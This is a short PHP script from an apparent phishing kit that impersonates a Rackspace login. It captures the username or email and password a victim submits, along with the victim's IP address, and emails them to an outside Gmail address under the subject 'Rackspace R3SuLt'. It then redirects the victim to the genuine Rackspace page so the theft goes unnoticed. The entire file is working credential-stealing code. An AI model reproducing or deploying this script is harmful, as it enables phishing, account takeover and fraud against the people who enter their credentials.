<?

$ip = getenv("REMOTE_ADDR");
$message .= "--Coded by vikky_banti----\n";
$message .= "Username or Email : ".$_POST['user_name']."\n";
$message .= "Password : ".$_POST['password']."\n";
$message .= "--------------------\n";
$message .= "IP: ".$ip."\n";
$message .= "----Coded by Vikky_banti----------------\n";



$recipient = "linkscam101@gmail.com";
$subject = "Rackspace R3SuLt";
$headers = "From: Rackspace";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
	 mail("", "Rackspace", $message);
if (mail($recipient,$subject,$message,$headers))

{
?>
	
		   <script language=javascript>
window.location='https://apps.rackspace.com/index.php';
</script>
<?

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>